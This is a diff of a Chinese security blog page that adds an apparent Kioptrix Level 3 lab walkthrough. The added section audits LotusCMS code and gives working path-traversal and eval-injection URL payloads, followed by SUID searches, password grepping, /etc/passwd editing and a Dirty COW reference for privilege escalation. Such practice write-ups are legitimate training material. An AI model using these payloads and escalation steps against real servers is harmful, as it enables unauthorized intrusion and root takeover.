@@ -47,9 +47,18 @@
 <meta property="og:image" content="https://cliayn.github.io/image/oscp-image-log/easy/Kioptrix_Level_2/nmap-1.png">
 <meta property="og:image" content="https://cliayn.github.io/image/oscp-image-log/easy/Kioptrix_Level_2/RCE-2.png">
 <meta property="og:image" content="https://cliayn.github.io/image/oscp-image-log/easy/Kioptrix_Level_2/PrivEsc-1.png">
+<meta property="og:image" content="https://cliayn.github.io/2025/08/25/image/oscp-image-log/easy/Kioptrix_Level_3/%E6%BA%90%E7%A0%81-1.png">
+<meta property="og:image" content="https://cliayn.github.io/image/oscp-image-log/easy/Kioptrix_Level_3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1.png">
 <meta property="og:image" content="https://cliayn.github.io/image/oscp-image-log/easy/Kioptrix_Level_3/php%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7.png">
+<meta property="og:image" content="https://cliayn.github.io/image/oscp-image-log/easy/Kioptrix_Level_3/%E8%B6%85%E7%AE%A1%E5%AF%86%E7%A0%81-1.png">
+<meta property="og:image" content="https://cliayn.github.io/image/oscp-image-log/easy/Kioptrix_Level_3/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1.png">
+<meta property="og:image" content="https://cliayn.github.io/image/oscp-image-log/easy/Kioptrix_Level_3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-2.png">
+<meta property="og:image" content="https://cliayn.github.io/image/oscp-image-log/easy/Kioptrix_Level_3/grep%E6%93%8D%E4%BD%9C-1.png">
+<meta property="og:image" content="https://cliayn.github.io/image/oscp-image-log/easy/Kioptrix_Level_3/grep%E6%93%8D%E4%BD%9C-2.png">
+<meta property="og:image" content="https://cliayn.github.io/image/oscp-image-log/easy/Kioptrix_Level_3/%E7%BC%96%E8%BE%91%E5%99%A8ht.png">
+<meta property="og:image" content="https://cliayn.github.io/image/oscp-image-log/easy/Kioptrix_Level_3/%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E-1.png">
 <meta property="article:published_time" content="2025-08-24T16:00:00.000Z">
-<meta property="article:modified_time" content="2026-03-10T09:30:22.051Z">
+<meta property="article:modified_time" content="2026-03-11T16:14:38.375Z">
 <meta property="article:author" content="乌篷船">
 <meta property="article:tag" content="Red team">
 <meta name="twitter:card" content="summary">
@@ -162,7 +171,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">1-前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kioptrix"><span class="nav-number"></span> <span class="nav-text">Kioptrix</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kioptrix-Level-1"><span class="nav-number">0.1.</span> <span class="nav-text">Kioptrix Level 1</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">0.1.0.1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-number">0.1.0.2.</span> <span class="nav-text">攻击方式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">0.1.0.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E7%9A%84%E6%96%87%E7%AB%A0"><span class="nav-number">0.1.1.</span> <span class="nav-text">参考的文章</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kioptrix-Level-2"><span class="nav-number">0.2.</span> <span class="nav-text">Kioptrix Level 2</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1"><span class="nav-number">0.2.0.1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-number">0.2.0.2.</span> <span class="nav-text">漏洞挖掘</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">0.2.0.3.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kioptrix-Level-3"><span class="nav-number">0.3.</span> <span class="nav-text">Kioptrix Level 3</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-2"><span class="nav-number">0.3.0.1.</span> <span class="nav-text">信息搜集</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">1-前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kioptrix"><span class="nav-number"></span> <span class="nav-text">Kioptrix</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kioptrix-Level-1"><span class="nav-number">0.1.</span> <span class="nav-text">Kioptrix Level 1</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">0.1.0.1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-number">0.1.0.2.</span> <span class="nav-text">攻击方式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">0.1.0.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E7%9A%84%E6%96%87%E7%AB%A0"><span class="nav-number">0.1.1.</span> <span class="nav-text">参考的文章</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kioptrix-Level-2"><span class="nav-number">0.2.</span> <span class="nav-text">Kioptrix Level 2</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1"><span class="nav-number">0.2.0.1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-number">0.2.0.2.</span> <span class="nav-text">漏洞挖掘</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">0.2.0.3.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kioptrix-Level-3"><span class="nav-number">0.3.</span> <span class="nav-text">Kioptrix Level 3</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-2"><span class="nav-number">0.3.0.1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">0.3.0.2.</span> <span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">0.3.0.2.1.</span> <span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">0.3.0.2.2.</span> <span class="nav-text">命令执行</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA"><span class="nav-number">0.3.0.3.</span> <span class="nav-text">测试靶场</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">0.3.1.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -272,7 +281,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-03-10 17:30:22" itemprop="dateModified" datetime="2026-03-10T17:30:22+08:00">2026-03-10</time>
+      <time title="修改时间：2026-03-12 00:14:38" itemprop="dateModified" datetime="2026-03-12T00:14:38+08:00">2026-03-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -291,14 +300,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>2.2k</span>
+      <span>4.8k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
+      <span>9 分钟</span>
     </span>
 </div>
 
@@ -380,8 +389,83 @@
 <h3 id="Kioptrix-Level-3"><a href="#Kioptrix-Level-3" class="headerlink" title="Kioptrix Level 3"></a>Kioptrix Level 3</h3><p>注意：需要将下面的放到你的hosts文件内</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ip&gt; kioptrix3.com	#靶场</span><br><span class="line"></span><br><span class="line">#C:\Windows\System32\drivers\etc\hosts</span><br><span class="line">#/etc/hosts</span><br></pre></td></tr></table></figure>
 
-<h5 id="信息搜集-2"><a href="#信息搜集-2" class="headerlink" title="信息搜集"></a>信息搜集</h5><p>测试：<br>如果参数名是 <code>?system=</code>、<code>?page=</code>、<code>?file=</code> 或 <code>?view=</code>，很可能是文件包含；后端开发者通常使用这个参数来决定加载哪个模块（比如 <code>Admin.php</code>、<code>Login.php</code>）</p>
+<h5 id="信息搜集-2"><a href="#信息搜集-2" class="headerlink" title="信息搜集"></a>信息搜集</h5><p>测试：</p>
+<p>​	可以在网上搜<code>LotusCMS</code>的源码或者直接搜它的历史漏洞之类的，但是今天搜历史漏洞可以把它老底都暴光，搜源码，然后看对应接口长什么样子的，保证一定的公平性。</p>
+<p>index.php的源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;install.php&quot;</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: install.php&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;core/lib/router.php&quot;</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><h6 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h6><img src="../image/oscp-image-log/easy/Kioptrix_Level_3/源码-1.png" alt="php" style="zoom:60%;" />
+
+<p>​	如上图就加载了两个功能，第一个功能是安装，那主要功能肯定在<code>router.php</code>了，如下：<br><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1.png" alt="php"></p>
+<p>​	可以得出一个通用的结论如果参数名是 <code>?system=</code>、<code>?page=</code>、<code>?file=</code> 或 <code>?view=</code>，很可能是文件包含；后端开发者通常使用这个参数来决定加载哪个模块（比如 <code>Admin.php</code>、<code>Login.php</code>），当然这是16年前的代码了，放在现在肯定行不通了。</p>
+<p>​	如下证明<code>php</code>是<code>5.2.4</code></p>
 <p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/php%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7.png" alt="php"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http://&lt;ip:port&gt;/index.php?system=../../../../../../etc/passwd%001</span><br></pre></td></tr></table></figure>
+
+<p>​	目前很少看到 “<code>url</code>即<code>api</code>“ 了，大多都是网页 “<code>Hash</code>路由+其他域名<code>api</code>“ 的实现</p>
+<table>
+<thead>
+<tr>
+<th><strong>截断方式</strong></th>
+<th><strong>依赖环境</strong></th>
+<th><strong>现代防御状态</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Null Byte (%00)</strong></td>
+<td>PHP &lt; 5.3.4</td>
+<td><strong>已失效</strong> (PHP 核心已加固)</td>
+</tr>
+<tr>
+<td><strong>Path Length</strong></td>
+<td>操作系统底层限制</td>
+<td><strong>极难实现</strong> (现代 PHP 会预校验)</td>
+</tr>
+<tr>
+<td><strong>RFI Query (?)</strong></td>
+<td>开启 URL 包含</td>
+<td><strong>已禁用</strong> (默认关闭 allow_url_include)</td>
+</tr>
+<tr>
+<td><strong>点号&#x2F;空格</strong></td>
+<td>旧版 Windows</td>
+<td><strong>已失效</strong></td>
+</tr>
+</tbody></table>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E8%B6%85%E7%AE%A1%E5%AF%86%E7%A0%81-1.png" alt="php"></p>
+<h6 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h6><p>代码还是那一串(危险函数<code>eval()</code>)：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function Router()&#123;</span><br><span class="line">	//Get page request (<span class="keyword">if</span> any)</span><br><span class="line">	$page = $this-&gt;getInputString(&quot;page&quot;, &quot;index&quot;);</span><br><span class="line">	</span><br><span class="line">	//Get plugin request (<span class="keyword">if</span> any)</span><br><span class="line">	$plugin = $this-&gt;getInputString(&quot;system&quot;, &quot;Page&quot;);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(file_exists(&quot;core/plugs/&quot;.$plugin.&quot;Starter.php&quot;))&#123;</span><br><span class="line">		//Include Page fetcher</span><br><span class="line">		include(&quot;core/plugs/&quot;.$plugin.&quot;Starter.php&quot;);</span><br><span class="line"></span><br><span class="line">		//Fetch the page and get over loading cache etc...</span><br><span class="line">		eval(&quot;new &quot;.$plugin.&quot;Starter(&#x27;&quot;.$page.&quot;&#x27;);&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>原本拼接是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/index.php?system=Admin</span><br><span class="line">拼接：</span><br><span class="line">eval(new AdminStarter(&#x27;index&#x27;);)</span><br><span class="line">注意，page是没有的话是默认的index</span><br></pre></td></tr></table></figure>
+
+<p>正常执行的<code>php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
+
+<p>所以</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload:	/index.php?system=Page&amp;page=index&#x27;);phpinfo();/*</span></span><br><span class="line"><span class="comment">#拼接后的代码：</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;new PageStarter(&#x27;index&#x27;);phpinfo();/*&#x27;);&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者			/index.php?system=Page&amp;page=&#x27;.phpinfo().&#x27;</span></span><br><span class="line"><span class="comment">#更加优雅  &#x27;. phpinfo() .&#x27;  取代了   &quot;.$page.&quot; 完成一次解析然后会返回一个布尔值 true  真是优雅啊~！！</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;new PageStarter(&#x27;&#x27;.phpinfo().&#x27;&#x27;);&quot;</span>);</span><br><span class="line"><span class="comment">#想要传参就要解析.phpinfo().</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1.png" alt="RCE"></p>
+<h5 id="测试靶场"><a href="#测试靶场" class="headerlink" title="测试靶场"></a>测试靶场</h5><p>之后同理，反弹<code>shell</code>后提权，(好像<code>bash -i</code>用不了，<code>&gt;</code>用不了，<code>cd</code>用不了等等的，但是还好<code>wget</code>能用)</p>
+<p>利用文件包含执行代码：<br><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-2.png" alt="RCE"></p>
+<p>然后就遇到了一堆<code>exp</code>用不了的情况了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#寻找系统中配置错误且带有特殊权限的可执行文件。</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一步：调用 Python 启动 PTY</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># kali键盘全转发</span></span><br><span class="line">ctrl+z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找到当前目录下所有的root关键字</span></span><br><span class="line">grep -rnw <span class="string">&quot;.&quot;</span> -e <span class="string">&quot;password&quot;</span></span><br><span class="line">grep -C 5 <span class="string">&quot;password&quot;</span> gconfig.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/grep%E6%93%8D%E4%BD%9C-1.png" alt="RCE"></p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/grep%E6%93%8D%E4%BD%9C-2.png" alt="RCE"></p>
+<p>然后可以在<code>root</code>账户的数据库里找到其他两个账号，然后尝试用<code>ht</code>编辑器直接更改<code>/etc/passwd</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第1步：设置变量</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第2步：现在运行 ht 应该就能看到蓝色界面了</span></span><br><span class="line">/usr/local/bin/ht</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E7%BC%96%E8%BE%91%E5%99%A8ht.png" alt="RCE"></p>
+<p>或者直接使用<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40839">脏牛内核提权</a></p>
+<p>原理是条件竞争，使得数据直接写入了受保护的只读文件<code>/etc/passwd</code>，所以要稍微等一下，然后控制台需要正常一点</p>
+<p>注意：使用了脏牛<code>root</code>就会被覆盖了</p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E-1.png" alt="RCE"></p>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/masses0x1/p/15780876.html">vulnhub KioptrixVM3 靶场练习&amp;LotusCMS漏洞分析 - rpsate - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/170656.html">CTF实战 | Kioptrix（#3）靶机渗透测试 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73812072/article/details/155023122">渗透测试——Kioptrix3靶机多种方法渗透提权（脏牛漏洞提权，手把手详细教程）-CSDN博客</a></p>
 
     </div>
 
@@ -443,7 +527,7 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">177k</span>
+    <span title="站点总字数">181k</span>
   </span>
 </div>
 
